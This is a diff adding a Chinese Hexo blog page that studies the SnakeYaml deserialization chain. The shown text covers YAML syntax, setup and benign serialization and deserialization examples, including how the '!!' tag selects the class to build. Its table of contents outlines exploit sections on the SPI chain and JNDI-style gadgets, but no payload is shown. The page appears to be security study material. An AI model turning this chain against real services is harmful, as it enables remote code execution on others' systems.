@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SnakeYaml 今天该学习SnakeYaml这条链子了，大概看了一遍文章，相比于刚学的ROME，难度还是有的  前置基础 Yaml语法 根据了解，SnakeYaml是Java的yaml解析类库，支持Java对象的序列化与反序列化（看见和FastJson比较像哈），我们来了解一下简单的yaml语法  Yaml特点   YAML对于大小写是敏感的 使用缩进代表层级关系 缩进只能用空格，不适用制表符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SnakeYaml链">
+<meta property="og:url" content="http://curlysean.github.io/2025/04/06/SnakeYaml%E9%93%BE/index.html">
+<meta property="og:site_name" content="肖恩的博客">
+<meta property="og:description" content="SnakeYaml 今天该学习SnakeYaml这条链子了，大概看了一遍文章，相比于刚学的ROME，难度还是有的  前置基础 Yaml语法 根据了解，SnakeYaml是Java的yaml解析类库，支持Java对象的序列化与反序列化（看见和FastJson比较像哈），我们来了解一下简单的yaml语法  Yaml特点   YAML对于大小写是敏感的 使用缩进代表层级关系 缩进只能用空格，不适用制表符">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549616834-c0dcccfc-27b3-4573-a465-9495ec745de7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549859994-4f958a75-8c5b-4dfc-b001-4e37198b78e7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742550978149-99d82295-b597-4b78-a8df-169f3e6e2e4e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742876145719-8e19efc5-880f-4d63-98bf-db4e39d65683.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742903926211-71a44dbc-d8f2-4042-82a3-2218ce8e5dd7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742904320541-93abe830-7b44-4064-91ba-b0396303238a.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742910581855-a7bcbf04-064c-4042-889f-f52cf171be6a.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742959338050-405c34f9-73bd-4d4a-a81a-9c76b0b8a26e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742960230310-81ce672d-d39e-45bb-9733-dca944b51a9f.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742961202448-0a0cb6c1-f697-4995-b64c-1c04f35f7c60.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743158772771-433b8527-a1d8-4a32-a00c-3a1f385a28d8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210046939-c3c5eef6-0754-4868-9b29-dac6c8ae2c71.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210490268-f626878f-6ad8-4ad0-a8d3-32af0a94d2bc.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210939037-ddab4274-f419-4687-ae8b-4902b5e0ab9f.png">
+<meta property="article:published_time" content="2025-04-06T14:10:59.226Z">
+<meta property="article:modified_time" content="2025-04-06T14:12:33.307Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="SnakeYaml">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549616834-c0dcccfc-27b3-4573-a465-9495ec745de7.png">
+
+
+<link rel="canonical" href="http://curlysean.github.io/2025/04/06/SnakeYaml%E9%93%BE/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/04/06/SnakeYaml%E9%93%BE/","path":"2025/04/06/SnakeYaml链/","title":"SnakeYaml链"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SnakeYaml链 | 肖恩的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">肖恩的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xZlPm"><span class="nav-number">1.</span> <span class="nav-text">SnakeYaml</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#c1rAa"><span class="nav-number">1.1.</span> <span class="nav-text">前置基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ihuYh"><span class="nav-number">1.1.1.</span> <span class="nav-text">Yaml语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#lL423"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">Yaml特点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#luNlk"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">YAML支持的三种数据结构</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#E2HRy"><span class="nav-number">1.2.</span> <span class="nav-text">SnakeYaml序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qKMfz"><span class="nav-number">1.2.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmuWM"><span class="nav-number">1.2.2.</span> <span class="nav-text">序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NW2Jg"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#YuqHI"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mInRk"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">奇怪的特性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sM80r"><span class="nav-number">1.3.</span> <span class="nav-text">序列化与反序列化断点调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#YHQsV"><span class="nav-number">1.3.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LijK3"><span class="nav-number">1.3.2.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJPOu"><span class="nav-number">1.3.3.</span> <span class="nav-text">奇怪特性的解释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Up6z3"><span class="nav-number">1.4.</span> <span class="nav-text">SnakeYaml 反序列化漏洞之 SPI 链子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UZsHY"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rOsYD"><span class="nav-number">1.4.2.</span> <span class="nav-text">利用 SPI 机制 - 基于 ScriptEngineManager 利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gWOCJ"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">EXP与攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SN9oS"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">SPL机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#D7BC4"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vp7T9"><span class="nav-number">1.5.</span> <span class="nav-text">SnakeYaml 反序列化漏洞的 Gadgets</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#O5hnp"><span class="nav-number">1.5.1.</span> <span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ygBkF"><span class="nav-number">1.5.2.</span> <span class="nav-text">Spring PropertyPathFactoryBean</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#aJfDU"><span class="nav-number">1.5.3.</span> <span class="nav-text">Apache XBean</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FRPd3"><span class="nav-number">1.5.4.</span> <span class="nav-text">C3P0 JndiRefForwardingDataSource</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zoBh0"><span class="nav-number">1.5.5.</span> <span class="nav-text">C3P0 WrapperConnectionPoolDataSource</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gwf3k"><span class="nav-number">1.5.6.</span> <span class="nav-text">Apache Commons Configuration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HBQzd"><span class="nav-number">1.6.</span> <span class="nav-text">SnakeYaml探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#z8ulA"><span class="nav-number">1.6.1.</span> <span class="nav-text">使用 Key 调用 hashCode 方法探测：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ZIHWq"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">探测内部类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fafJz"><span class="nav-number">1.7.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/04/06/SnakeYaml%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SnakeYaml链 | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SnakeYaml链
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-04-06 22:10:59 / 修改时间：22:12:33" itemprop="dateCreated datePublished" datetime="2025-04-06T22:10:59+08:00">2025-04-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="xZlPm">SnakeYaml</h1>
+今天该学习SnakeYaml这条链子了，大概看了一遍文章，相比于刚学的ROME，难度还是有的
+
+<h2 id="c1rAa">前置基础</h2>
+<h3 id="ihuYh">Yaml语法</h3>
+根据了解，SnakeYaml是Java的yaml解析类库，支持Java对象的序列化与反序列化（看见和FastJson比较像哈），我们来了解一下简单的yaml语法
+
+<h4 id="lL423">Yaml特点</h4>
+
+<ol>
+<li>YAML对于大小写是敏感的</li>
+<li>使用缩进代表层级关系</li>
+<li>缩进只能用空格，不适用制表符（TAB），不要求空格个数，只要相同层级左对齐（一般两个空格或者四个）</li>
+</ol>
+<h4 id="luNlk">YAML支持的三种数据结构</h4>
+
+<ul>
+<li>对象</li>
+</ul>
+<p>使用冒号，格式如下（冒号后面要加空格）</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure>
+
+<p>而缩进可以用来代表层级关系（隐隐约约记得在spring的配置文件中是这么搞得）</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line">    <span class="attr">child-key:</span> <span class="string">value</span></span><br><span class="line">    <span class="attr">child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>数组</li>
+</ul>
+<p>使用一个短横线和一个空格代表一个数组项</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hobby:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Java</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Python</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>常量</li>
+</ul>
+<p>Yaml中提供多种的常量结构：整数，浮点数，字符串，NULL，日期，布尔，时间</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">boolean:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment">#true,True都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line"><span class="attr">null:</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    <span class="attr">parent:</span> <span class="string">~</span>  <span class="comment">#使用~表示null</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哈哈</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2022-07-28</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="attr">datetime:</span> </span><br><span class="line">    <span class="bullet">-</span>  <span class="number">2022-07-28T15:02:31+08:00</span>    <span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="E2HRy">SnakeYaml序列化与反序列化</h2>
+SnakeYaml提供了两个函数对yaml格式数据进行序列化与反序列化
+
+<ul>
+<li>Yaml.load()：提供参数为一个yaml字符串或者一个文件，可以将yaml格式数据进行反序列化后返回Java对象</li>
+<li>Yaml.dump() ：提供参数为一个Java对象，可以将一个Java对象序列化为yaml文件格式</li>
+</ul>
+<h3 id="qKMfz">环境配置</h3>
+
+<ul>
+<li>JDK8u65</li>
+<li><font style="color:#080808;background-color:#ffffff;">snakeyaml1.27</font></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先写一个实体类<code>Person.java</code>，序列化和反序列化都用的是这个实体类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="wmuWM">序列化与反序列化</h3>
+<h4 id="NW2Jg">序列化</h4>
+将一个java类序列化的代码如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sean&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        System.out.println(yaml.dump(person));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化的结果如下，调用了两个属性的getter方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742549616834-c0dcccfc-27b3-4573-a465-9495ec745de7.png"></p>
+<h4 id="YuqHI">反序列化</h4>
+反序列化有两种方法，下面的代码中都有体现
+
+<ul>
+<li>load()：</li>
+</ul>
+<p>下面的<code>!!</code>类似于 Fastjson 中的 <code>@type</code> 用于指定反序列化的全类名，后面的就类似于Fastjson中的赋值</p>
+<ul>
+<li>loadAs()</li>
+</ul>
+<p><code>loadAs</code>函数进行反序列化，其中反序列化对象的类需要指定，而赋值的参数和值，需要符合Yaml的语法格式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string1</span> <span class="operator">=</span> <span class="string">&quot;!!com.Person &#123;age: 18, name: sean&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> yaml.load(string1);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string2</span> <span class="operator">=</span> <span class="string">&quot;name: sean\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age: 18&quot;</span> ;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> yaml.loadAs(string2, Person.class);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看到，两者的效果是一样的，且在进行反序列化的时候，都调用了两个属性的setter方法</p>
